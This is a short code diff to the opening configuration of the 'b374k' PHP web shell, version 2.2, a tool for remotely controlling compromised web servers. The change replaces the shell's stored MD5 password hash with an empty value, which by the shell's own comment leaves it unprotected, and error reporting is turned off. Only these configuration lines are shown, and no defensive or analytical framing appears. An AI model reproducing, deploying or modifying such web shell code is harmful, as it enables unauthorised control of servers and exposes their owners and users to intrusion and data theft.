@@ -6,7 +6,7 @@ error_reporting(0);
 $s_name = "b374k"; // shell name
 $s_ver = "2.2"; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
-$s_pass = "fefb1f11c7b522084e72fd1f0acf82ed"; // shell password, fill with password in md5 format to protect shell
+$s_pass = ""; // shell password, fill with password in md5 format to protect shell
 $s_login_time = 3600 * 24 * 7;
 
 $s_auth = false; // login status
